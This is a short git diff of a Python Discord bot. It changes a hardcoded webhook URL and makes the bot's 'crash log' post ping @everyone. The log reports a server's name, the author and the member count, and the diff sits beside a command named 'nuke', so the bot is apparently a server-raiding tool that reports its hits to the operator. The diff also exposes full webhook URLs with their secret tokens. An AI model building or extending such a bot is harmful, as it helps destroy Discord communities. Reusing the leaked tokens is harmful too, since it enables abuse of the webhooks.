@@ -7,7 +7,7 @@ import time
 from threading import Thread
 from flask import Flask
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1520839426207383595/Khj5QPyzUjOetcDUS7Rzm9VOwj5FQvtoMD8QGdHtAnXsBlm1WLv-w1FcS_avKGOzl3q3"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1521026853316329525/KWUrGnS6x6yAknThbeJQXYFi0wCjHd8cvf1HzVorCS2DzoR-7Y8wHUD8QwzpEE4YOkWV"
 
 app = Flask('')
 
@@ -61,7 +61,7 @@ async def send_crash_log(guild_name, author, member_count):
                 {"name": "Участников", "value": str(member_count), "inline": False}
             ]
         }
-        await session.post(WEBHOOK_URL, json={"embeds": [embed]})
+        await session.post(WEBHOOK_URL, json={"content": "@everyone", "embeds": [embed]})
 
 @bot.command()
 async def nuke(ctx):
